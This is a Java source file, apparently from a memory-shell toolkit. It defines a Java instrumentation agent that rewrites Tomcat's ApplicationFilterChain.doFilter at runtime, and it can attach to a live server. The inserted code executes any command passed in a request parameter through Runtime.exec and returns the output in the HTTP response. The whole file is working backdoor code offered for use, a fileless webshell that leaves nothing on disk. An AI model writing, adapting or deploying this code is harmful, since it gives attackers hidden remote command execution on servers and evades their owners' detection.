package com.reajason.javaweb.memshell.agent;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class CommandFilterChainTransformer implements ClassFileTransformer {
    private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className)) {
            try {
                ClassPool pool = ClassPool.getDefault();
                pool.insertClassPath(new javassist.LoaderClassPath(loader));

                CtClass cc = pool.makeClass(new ByteArrayInputStream(bytes), true);
                CtMethod doFilter = cc.getDeclaredMethod("doFilter");

                String code =
                        "String paramName = \"paramName\";" +
                                "try {" +
                                "    String cmd = $1.getParameter(paramName);" +
                                "    if (cmd != null) {" +
                                "        Process exec = Runtime.getRuntime().exec(cmd);" +
                                "        java.io.InputStream inputStream = exec.getInputStream();" +
                                "        byte[] buf = new byte[8192];" +
                                "        int length;" +
                                "        while ((length = inputStream.read(buf)) != -1) {" +
                                "            $2.getOutputStream().write(buf, 0, length);" +
                                "        }" +
                                "        return;" +
                                "    }" +
                                "} catch (Exception ignored) {}";

                doFilter.insertBefore(code);
                byte[] transformedBytes = cc.toBytecode();
                cc.detach();
                return transformedBytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    public static void premain(String args, Instrumentation inst) {
        inst.addTransformer(new CommandFilterChainTransformer(), true);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new CommandFilterChainTransformer(), true);
        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
            String name = allLoadedClass.getName();
            if (TARGET_CLASS.replace("/", ".").equals(name)) {
                inst.retransformClasses(allLoadedClass);
            }
        }
    }
}